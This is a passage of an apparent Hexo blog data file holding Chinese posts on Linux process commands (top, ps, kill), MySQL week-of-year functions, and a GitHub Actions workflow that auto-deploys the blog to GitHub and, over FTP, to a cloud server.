|\n\n### 杀死进程\n\n* 根据进程id杀死进程\n  * `kill xxxx`，`xxxx`替换为PID，即进程id，例如`kill 3781`，强制终止可以添加`-9`参数，例如`kill -9 3781`\n* 根据名称杀死进程\n  * `killall xxxx`，`xxxx`替换为进程名称，例如`killall python`\n  * `pkill xxxx`，`xxxx`替换为进程名称，例如`pkill python`\n\n\n\n","slug":"newpost-17","published":1,"updated":"2021-07-23T06:04:26.452Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcv000cq0sz9gb0cc9x","content":"<h4 id=\"按内存或cpu占用排序\"><a href=\"#按内存或cpu占用排序\" class=\"headerlink\" title=\"按内存或cpu占用排序\"></a>按内存或cpu占用排序</h4><p>首先输入<code>top</code>命令，然后:</p>\n<ul>\n<li><p>按<code>P</code>-以 CPU 占用率大小的顺序排列进程列表</p>\n</li>\n<li><p>按<code>M</code>-以内存占用率大小的顺序排列进程列表</p>\n</li>\n</ul>\n<a id=\"more\"></a>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>列名</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>PID</td>\n<td>进程id</td>\n</tr>\n<tr>\n<td>2</td>\n<td>USER</td>\n<td>进程所有者的用户名</td>\n</tr>\n<tr>\n<td>3</td>\n<td>RP</td>\n<td>优先级</td>\n</tr>\n<tr>\n<td>4</td>\n<td>NI</td>\n<td>nice值。负值表示高优先级，正值表示低优先级</td>\n</tr>\n<tr>\n<td>5</td>\n<td>VIRT</td>\n<td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td>\n</tr>\n<tr>\n<td>6</td>\n<td>RES</td>\n<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>\n</tr>\n<tr>\n<td>7</td>\n<td>SHR</td>\n<td>共享内存大小，单位kb</td>\n</tr>\n<tr>\n<td>8</td>\n<td>S</td>\n<td>进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程)</td>\n</tr>\n<tr>\n<td>9</td>\n<td>%CPU</td>\n<td>上次更新到现在的CPU时间占用百分比</td>\n</tr>\n<tr>\n<td>10</td>\n<td>%MEM</td>\n<td>进程使用的物理内存百分比</td>\n</tr>\n<tr>\n<td>11</td>\n<td>TIME+</td>\n<td>进程使用的CPU时间总计，单位1/100秒</td>\n</tr>\n<tr>\n<td>12</td>\n<td>COMMAND</td>\n<td>命令名/命令行</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>按<code>q</code>退出</li>\n</ul>\n<h3 id=\"查询指定名称的进程\"><a href=\"#查询指定名称的进程\" class=\"headerlink\" title=\"查询指定名称的进程\"></a>查询指定名称的进程</h3><p>使用命令<code>ps -ef|grep xxxx</code>，其中<code>xxxx</code>替换为你想要查询的进程名，例如<code>ps -ef|grep python</code></p>\n<table>\n<thead>\n<tr>\n<th>列号</th>\n<th>列名</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>USER</td>\n<td>进程所有者的用户名</td>\n</tr>\n<tr>\n<td>2</td>\n<td>PID</td>\n<td>进程id</td>\n</tr>\n<tr>\n<td>3</td>\n<td>PPID</td>\n<td>父进程id</td>\n</tr>\n<tr>\n<td>4</td>\n<td>C</td>\n<td>使用的资源百分比</td>\n</tr>\n<tr>\n<td>5</td>\n<td>STIME</td>\n<td>系统启动时间</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TTY</td>\n<td>登入者的终端机位置</td>\n</tr>\n<tr>\n<td>7</td>\n<td>COMMAND</td>\n<td>命令名/命令行</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"杀死进程\"><a href=\"#杀死进程\" class=\"headerlink\" title=\"杀死进程\"></a>杀死进程</h3><ul>\n<li>根据进程id杀死进程<ul>\n<li><code>kill xxxx</code>，<code>xxxx</code>替换为PID，即进程id，例如<code>kill 3781</code>，强制终止可以添加<code>-9</code>参数，例如<code>kill -9 3781</code></li>\n</ul>\n</li>\n<li>根据名称杀死进程<ul>\n<li><code>killall xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>killall python</code></li>\n<li><code>pkill xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>pkill python</code></li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"按内存或cpu占用排序\"><a href=\"#按内存或cpu占用排序\" class=\"headerlink\" title=\"按内存或cpu占用排序\"></a>按内存或cpu占用排序</h4><p>首先输入<code>top</code>命令，然后:</p>\n<ul>\n<li><p>按<code>P</code>-以 CPU 占用率大小的顺序排列进程列表</p>\n</li>\n<li><p>按<code>M</code>-以内存占用率大小的顺序排列进程列表</p>\n</li>\n</ul>","more":"<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>列名</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>PID</td>\n<td>进程id</td>\n</tr>\n<tr>\n<td>2</td>\n<td>USER</td>\n<td>进程所有者的用户名</td>\n</tr>\n<tr>\n<td>3</td>\n<td>RP</td>\n<td>优先级</td>\n</tr>\n<tr>\n<td>4</td>\n<td>NI</td>\n<td>nice值。负值表示高优先级，正值表示低优先级</td>\n</tr>\n<tr>\n<td>5</td>\n<td>VIRT</td>\n<td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td>\n</tr>\n<tr>\n<td>6</td>\n<td>RES</td>\n<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>\n</tr>\n<tr>\n<td>7</td>\n<td>SHR</td>\n<td>共享内存大小，单位kb</td>\n</tr>\n<tr>\n<td>8</td>\n<td>S</td>\n<td>进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程)</td>\n</tr>\n<tr>\n<td>9</td>\n<td>%CPU</td>\n<td>上次更新到现在的CPU时间占用百分比</td>\n</tr>\n<tr>\n<td>10</td>\n<td>%MEM</td>\n<td>进程使用的物理内存百分比</td>\n</tr>\n<tr>\n<td>11</td>\n<td>TIME+</td>\n<td>进程使用的CPU时间总计，单位1/100秒</td>\n</tr>\n<tr>\n<td>12</td>\n<td>COMMAND</td>\n<td>命令名/命令行</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>按<code>q</code>退出</li>\n</ul>\n<h3 id=\"查询指定名称的进程\"><a href=\"#查询指定名称的进程\" class=\"headerlink\" title=\"查询指定名称的进程\"></a>查询指定名称的进程</h3><p>使用命令<code>ps -ef|grep xxxx</code>，其中<code>xxxx</code>替换为你想要查询的进程名，例如<code>ps -ef|grep python</code></p>\n<table>\n<thead>\n<tr>\n<th>列号</th>\n<th>列名</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>USER</td>\n<td>进程所有者的用户名</td>\n</tr>\n<tr>\n<td>2</td>\n<td>PID</td>\n<td>进程id</td>\n</tr>\n<tr>\n<td>3</td>\n<td>PPID</td>\n<td>父进程id</td>\n</tr>\n<tr>\n<td>4</td>\n<td>C</td>\n<td>使用的资源百分比</td>\n</tr>\n<tr>\n<td>5</td>\n<td>STIME</td>\n<td>系统启动时间</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TTY</td>\n<td>登入者的终端机位置</td>\n</tr>\n<tr>\n<td>7</td>\n<td>COMMAND</td>\n<td>命令名/命令行</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"杀死进程\"><a href=\"#杀死进程\" class=\"headerlink\" title=\"杀死进程\"></a>杀死进程</h3><ul>\n<li>根据进程id杀死进程<ul>\n<li><code>kill xxxx</code>，<code>xxxx</code>替换为PID，即进程id，例如<code>kill 3781</code>，强制终止可以添加<code>-9</code>参数，例如<code>kill -9 3781</code></li>\n</ul>\n</li>\n<li>根据名称杀死进程<ul>\n<li><code>killall xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>killall python</code></li>\n<li><code>pkill xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>pkill python</code></li>\n</ul>\n</li>\n</ul>"},{"title":"mysql获取当期日期是该年第几周","date":"2021-06-21T05:52:30.000Z","_content":"\n* 最简单常用，返回值为4，这种情况按国际标准，周四在哪一年，这周就属于哪一年，默认周一是一周的第一天\n\n```mysql\nWEEKOFYEAR('2020-01-20')\n```\n\n<!--more-->\n\n* 上边的等价于，但下边的返回值会带上年，如202004\n\n```mysql\nYEARWEEK('2020-01-20',1)\n```\n\n* 网上常见的方法\n\n```mysql\nWEEK(date_add('2020-01-20',interval 6 day),2)\n```\n\n","source":"_posts/newpost-14.md","raw":"---\ntitle: mysql获取当期日期是该年第几周\ndate: 2021-06-21 13:52:30\ntags: [编程,MySQL]\n---\n\n* 最简单常用，返回值为4，这种情况按国际标准，周四在哪一年，这周就属于哪一年，默认周一是一周的第一天\n\n```mysql\nWEEKOFYEAR('2020-01-20')\n```\n\n<!--more-->\n\n* 上边的等价于，但下边的返回值会带上年，如202004\n\n```mysql\nYEARWEEK('2020-01-20',1)\n```\n\n* 网上常见的方法\n\n```mysql\nWEEK(date_add('2020-01-20',interval 6 day),2)\n```\n\n","slug":"newpost-14","published":1,"updated":"2021-06-21T06:21:06.290Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcx000eq0szindfro04","content":"<ul>\n<li>最简单常用，返回值为4，这种情况按国际标准，周四在哪一年，这周就属于哪一年，默认周一是一周的第一天</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEEKOFYEAR(&apos;2020-01-20&apos;)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<ul>\n<li>上边的等价于，但下边的返回值会带上年，如202004</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YEARWEEK(&apos;2020-01-20&apos;,1)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>网上常见的方法</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEEK(date_add(&apos;2020-01-20&apos;,interval 6 day),2)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<ul>\n<li>最简单常用，返回值为4，这种情况按国际标准，周四在哪一年，这周就属于哪一年，默认周一是一周的第一天</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEEKOFYEAR(&apos;2020-01-20&apos;)</span><br></pre></td></tr></table></figure>","more":"<ul>\n<li>上边的等价于，但下边的返回值会带上年，如202004</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">YEARWEEK(&apos;2020-01-20&apos;,1)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>网上常见的方法</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEEK(date_add(&apos;2020-01-20&apos;,interval 6 day),2)</span><br></pre></td></tr></table></figure>"},{"title":"Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器","date":"2021-07-23T09:41:16.000Z","_content":"\n### 本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考[Hexo安装配置并托管至github](https://blog.ctftools.com/2017/12/post233/)\n\n### 如果不想依赖github，可以参考这套自建方案[centos下hexo + svn + jenkins实现博客自动部署](https://blog.ctftools.com/2020/11/post249/)、[svn提交后jenkins自动部署](https://blog.ctftools.com/2020/11/newpost-1/)\n\n<!--more-->\n\n## 一、新建github私有仓库保存hexo源码\n\n不细说\n\n## 二、Github Actions配置\n\n### 2.1 配置仓库私钥\n\n进入存放源码的私有仓库，点击`Settings`-`Secrets`，`New repository secret`，新建名为`HEXO_DEPLOY_PRIVATE_KEY`的私钥，值为你的私钥，通常可以在`\\.ssh\\id_rsa`中的获取到。\n\n### 2.2 配置Actions\n\n点击私有仓库`Actions`-`New workflow`-` set up a workflow yourself`，内容编辑如下，把其中的`名字`和`邮箱`替换成你自己的\n\n```yml\n# workflow name\nname: Hexo博客持续集成\n\n# master branch on push, auto run\non: \n  push:\n    branches:\n      - master\n      \njobs:\n  build: \n    runs-on: ubuntu-latest \n\n    steps:\n    # check it to your workflow can access it\n    # from: https://github.com/actions/checkout\n    - name: 检出仓库代码\n      uses: actions/checkout@master\n\n    # from: https://github.com/actions/setup-node\n    - name: 安装Node.js 11.x \n      uses: actions/setup-node@master\n      with:\n        node-version: \"11.x\"\n\n    - name: 安装Hexo依赖\n      run: |\n        npm install hexo-cli -g\n        npm install\n\n    - name: 配置部署私钥\n      env:\n        HEXO_DEPLOY_PRIVATE_KEY: ${{ secrets.HEXO_DEPLOY_PRIVATE_KEY }}\n      run: |\n        mkdir -p ~/.ssh/\n        echo \"$HEXO_DEPLOY_PRIVATE_KEY\" > ~/.ssh/id_rsa\n        chmod 600 ~/.ssh/id_rsa\n        ssh-keyscan github.com >> ~/.ssh/known_hosts\n\n    - name: 配置GIT信息\n      run: |\n        git config --global user.name '名字'\n        git config --global user.email '邮箱'\n\n    - name: 部署Hexo到Github\n      run: |\n        hexo clean\n        hexo generate\n        hexo deploy\n\n```\n\n完成后点击右上角`Start commit`-`Commit new ile`，这个Actions是提交代码后触发，快去试试吧，提交后约需要1分钟部署，之后就能在你托管的页面看到最新的博客了\n\n如果需要通过ftp传到国内云加速访问，可以在上边的内容紧接着加上以下内容，具体配置参考[FTP-Deploy-Action](https://github.com/SamKirkland/FTP-Deploy-Action)\n\n**ftp连接国内会比较慢，尤其是第一次，因为要全量上传，之后增量上传会快很多。**\n\n还有**注意服务器要放行FTP被动模式端口**，否则能创建文件夹，但不能上传文件。被动模式端口可能是30000-40000，或者3000-4000，这个是可以在你的FTP服务端软件配置的，类似于`PassivePortRange 39000 40000`。\n\n```yml\n    - name: 部署Hexo到云服务器\n      uses: SamKirkland/FTP-Deploy-Action@4.1.0\n      with:\n        server: ${{ secrets.FTP_SERVER }}\n        username: ${{ secrets.FTP_USERNAME }}\n        password: ${{ secrets.FTP_PASSWORD }}\n        local-dir: ./public/\n```\n\n注意这需要在私有仓库，`Settings`-`Secrets`，`New repository secret`，新建相应secret，方法与上边新建`HEXO_DEPLOY_PRIVATE_KEY`一样，`FTP_SERVER`不用带`ftp://`之类的，直接填入`ftp.xxx.com`即可。\n\n参考文章：[利用GitHub+Actions自动部署Hexo博客](https://blog.csdn.net/u012208219/article/details/106883054#comments_15417337)，[GitHub Actions 自动发布Hexo 并通过 FTP上传 到阿里云ECS](https://moeci.com/posts/github-actions-hexo-ftp/)\n","source":"_posts/newpost-18.md","raw":"---\ntitle: Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器\ndate: 2021-07-23 17:41:16\ntags: 运维\n---\n\n### 本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考[Hexo安装配置并托管至github](https://blog.ctftools.com/2017/12/post233/)\n\n### 如果不想依赖github，可以参考这套自建方案[centos下hexo + svn + jenkins实现博客自动部署](https://blog.ctftools.com/2020/11/post249/)、[svn提交后jenkins自动部署](https://blog.ctftools.com/2020/11/newpost-1/)\n\n<!--more-->\n\n## 一、新建github私有仓库保存hexo源码\n\n不细说\n\n## 二、Github Actions配置\n\n### 2.1 配置仓库私钥\n\n进入存放源码的私有仓库，点击`Settings`-`Secrets`，`New repository secret`，新建名为`HEXO_DEPLOY_PRIVATE_KEY`的私钥，值为你的私钥，通常可以在`\\.ssh\\id_rsa`中的获取到。\n\n### 2.2 配置Actions\n\n点击私有仓库`Actions`-`New workflow`-` set up a workflow yourself`，内容编辑如下，把其中的`名字`和`邮箱`替换成你自己的\n\n```yml\n# workflow name\nname: Hexo博客持续集成\n\n# master branch on push, auto run\non: \n  push:\n    branches:\n      - master\n      \njobs:\n  build: \n    runs-on: ubuntu-latest \n\n    steps:\n    # check it to your workflow can access it\n    # from: https://github.com/actions/checkout\n    - name: 检出仓库代码\n      uses: actions/checkout@master\n\n    # from: https://github.com/actions/setup-node\n    - name: 安装Node.js 11.x \n      uses: actions/setup-node@master\n      with:\n        node-version: \"11.x\"\n\n    - name: 安装Hexo依赖\n      run: |\n        npm install hexo-cli -g\n        npm install\n\n    - name: 配置部署私钥\n      env:\n        HEXO_DEPLOY_PRIVATE_KEY: ${{ secrets.HEXO_DEPLOY_PRIVATE_KEY }}\n      run: |\n        mkdir -p ~/.ssh/\n        echo \"$HEXO_DEPLOY_PRIVATE_KEY\" > ~/.ssh/id_rsa\n        chmod 600 ~/.ssh/id_rsa\n        ssh-keyscan github.com >> ~/.ssh/known_hosts\n\n    - name: 配置GIT信息\n      run: |\n        git config --global user.name '名字'\n        git config --global user.email '邮箱'\n\n    - name: 部署Hexo到Github\n      run: |\n        hexo clean\n        hexo generate\n        hexo deploy\n\n```\n\n完成后点击右上角`Start commit`-`Commit new ile`，这个Actions是提交代码后触发，快去试试吧，提交后约需要1分钟部署，之后就能在你托管的页面看到最新的博客了\n\n如果需要通过ftp传到国内云加速访问，可以在上边的内容紧接着加上以下内容，具体配置参考[FTP-Deploy-Action](https://github.com/SamKirkland/FTP-Deploy-Action)\n\n**ftp连接国内会比较慢，尤其是第一次，因为要全量上传，之后增量上传会快很多。**\n\n还有**注意服务器要放行FTP被动模式端口**，否则能创建文件夹，但不能上传文件。被动模式端口可能是30000-40000，或者3000-4000，这个是可以在你的FTP服务端软件配置的，类似于`PassivePortRange 39000 40000`。\n\n```yml\n    - name: 部署Hexo到云服务器\n      uses: SamKirkland/FTP-Deploy-Action@4.1.0\n      with:\n        server: ${{ secrets.FTP_SERVER }}\n        username: ${{ secrets.FTP_USERNAME }}\n        password: ${{ secrets.FTP_PASSWORD }}\n        local-dir: ./public/\n```\n\n注意这需要在私有仓库，`Settings`-`Secrets`，`New repository secret`，新建相应secret，方法与上边新建`HEXO_DEPLOY_PRIVATE_KEY`一样，`FTP_SERVER`不用带`ftp://`之类的，直接填入`ftp.xxx.com`即可。\n\n参考文章：[利用GitHub+Actions自动部署Hexo博客](https://blog.csdn.net/u012208219/article/details/106883054#comments_15417337)，[GitHub Actions 自动发布Hexo 并通过 FTP上传 到阿里云ECS](https://moeci.com/posts/github-actions-hexo-ftp/)\n","slug":"newpost-18","published":1,"updated":"2021-07-27T05:52:37.797Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcy000gq0szeugj62i5","content":"<h3 id=\"本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\"><a href=\"#本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\" class=\"headerlink\" title=\"本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\"></a>本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考<a href=\"https://blog.ctftools.com/2017/12/post233/\">Hexo安装配置并托管至github</a></h3><h3 id=\"如果不想依赖github，可以参考这套自建方案centos下hexo-svn-jenkins实现博客自动部署、svn提交后jenkins自动部署\"><a href=\"#如果不想依赖github，可以参考这套自建方案centos下hexo-svn-jenkins实现博客自动部署、svn提交后jenkins自动部署\" class=\"headerlink\" title=\"如果不想依赖github，可以参考这套自建方案centos下hexo + svn + jenkins实现博客自动部署、svn提交后jenkins自动部署\"></a>如果不想依赖github，可以参考这套自建方案<a href=\"https://blog.ctftools.com/2020/11/post249/\">centos下hexo + svn + jenkins实现博客自动部署</a>、<a href=\"https://blog.ctftools.com/2020/11/newpost-1/\">svn提交后jenkins自动部署</a></h3><a id=\"more\"></a>\n<h2 id=\"一、新建github私有仓库保存hexo源码\"><a href=\"#一、新建github私有仓库保存hexo源码\" class=\"headerlink\" title=\"一、新建github私有仓库保存hexo源码\"></a>一、新建github私有仓库保存hexo源码</h2><p>不细说</p>\n<h2 id=\"二、Github-Actions配置\"><a href=\"#二、Github-Actions配置\" class=\"headerlink\" title=\"二、Github Actions配置\"></a>二、Github Actions配置</h2><h3 id=\"2-1-配置仓库私钥\"><a href=\"#2-1-配置仓库私钥\" class=\"headerlink\" title=\"2.1 配置仓库私钥\"></a>2.1 配置仓库私钥</h3><p>进入存放源码的私有仓库，点击<code>Settings</code>-<code>Secrets</code>，<code>New repository secret</code>，新建名为<code>HEXO_DEPLOY_PRIVATE_KEY</code>的私钥，值为你的私钥，通常可以在<code>\\.ssh\\id_rsa</code>中的获取到。</p>\n<h3 id=\"2-2-配置Actions\"><a href=\"#2-2-配置Actions\" class=\"headerlink\" title=\"2.2 配置Actions\"></a>2.2 配置Actions</h3><p>点击私有仓库<code>Actions</code>-<code>New workflow</code>-<code>set up a workflow yourself</code>，内容编辑如下，把其中的<code>名字</code>和<code>邮箱</code>替换成你自己的</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># workflow name</span></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Hexo博客持续集成</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># master branch on push, auto run</span></span><br><span class=\"line\"><span class=\"attr\">on:</span> </span><br><span class=\"line\"><span class=\"attr\">  push:</span></span><br><span class=\"line\"><span class=\"attr\">    branches:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">master</span></span><br><span class=\"line\">      </span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\"><span class=\"attr\">  build:</span> </span><br><span class=\"line\"><span class=\"attr\">    runs-on:</span> <span class=\"string\">ubuntu-latest</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">    steps:</span></span><br><span class=\"line\">    <span class=\"comment\"># check it to your workflow can access it</span></span><br><span class=\"line\">    <span class=\"comment\"># from: https://github.com/actions/checkout</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">检出仓库代码</span></span><br><span class=\"line\"><span class=\"attr\">      uses:</span> <span class=\"string\">actions/checkout@master</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># from: https://github.com/actions/setup-node</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">安装Node.js</span> <span class=\"number\">11.</span><span class=\"string\">x</span> </span><br><span class=\"line\"><span class=\"attr\">      uses:</span> <span class=\"string\">actions/setup-node@master</span></span><br><span class=\"line\"><span class=\"attr\">      with:</span></span><br><span class=\"line\"><span class=\"attr\">        node-version:</span> <span class=\"string\">\"11.x\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">安装Hexo依赖</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        npm install hexo-cli -g</span></span><br><span class=\"line\"><span class=\"string\">        npm install</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">配置部署私钥</span></span><br><span class=\"line\"><span class=\"attr\">      env:</span></span><br><span class=\"line\"><span class=\"attr\">        HEXO_DEPLOY_PRIVATE_KEY:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.HEXO_DEPLOY_PRIVATE_KEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        mkdir -p ~/.ssh/</span></span><br><span class=\"line\"><span class=\"string\">        echo \"$HEXO_DEPLOY_PRIVATE_KEY\" &gt; ~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"string\">        chmod 600 ~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"string\">        ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">配置GIT信息</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        git config --global user.name '名字'</span></span><br><span class=\"line\"><span class=\"string\">        git config --global user.email '邮箱'</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">部署Hexo到Github</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        hexo clean</span></span><br><span class=\"line\"><span class=\"string\">        hexo generate</span></span><br><span class=\"line\"><span class=\"string\">        hexo deploy</span></span><br></pre></td></tr></table></figure>\n<p>完成后点击右上角<code>Start commit</code>-<code>Commit new ile</code>，这个Actions是提交代码后触发，快去试试吧，提交后约需要1分钟部署，之后就能在你托管的页面看到最新的博客了</p>\n<p>如果需要通过ftp传到国内云加速访问，可以在上边的内容紧接着加上以下内容，具体配置参考<a href=\"https://github.com/SamKirkland/FTP-Deploy-Action\" target=\"_blank\" rel=\"noopener\">FTP-Deploy-Action</a></p>\n<p><strong>ftp连接国内会比较慢，尤其是第一次，因为要全量上传，之后增量上传会快很多。</strong></p>\n<p>还有<strong>注意服务器要放行FTP被动模式端口</strong>，否则能创建文件夹，但不能上传文件。被动模式端口可能是30000-40000，或者3000-4000，这个是可以在你的FTP服务端软件配置的，类似于<code>PassivePortRange 39000 40000</code>。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">部署Hexo到云服务器</span></span><br><span class=\"line\"><span class=\"attr\">  uses:</span> <span class=\"string\">SamKirkland/FTP-Deploy-Action@4.1.0</span></span><br><span class=\"line\"><span class=\"attr\">  with:</span></span><br><span class=\"line\"><span class=\"attr\">    server:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_SERVER</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    username:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_USERNAME</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    password:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_PASSWORD</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    local-dir:</span> <span class=\"string\">./public/</span></span><br></pre></td></tr></table></figure>\n<p>注意这需要在私有仓库，<code>Settings</code>-<code>Secrets</code>，<code>New repository secret</code>，新建相应secret，方法与上边新建<code>HEXO_DEPLOY_PRIVATE_KEY</code>一样，<code>FTP_SERVER</code>不用带<code>ftp://</code>之类的，直接填入<code>ftp.xxx.com</code>即可。</p>\n<p>参考文章：<a href=\"https://blog.csdn.net/u012208219/article/details/106883054#comments_15417337\" target=\"_blank\" rel=\"noopener\">利用GitHub+Actions自动部署Hexo博客</a>，<a href=\"https://moeci.com/posts/github-actions-hexo-ftp/\" target=\"_blank\" rel=\"noopener\">GitHub Actions 自动发布Hexo 并通过 FTP上传 到阿里云ECS</a></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\"><a href=\"#本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\" class=\"headerlink\" 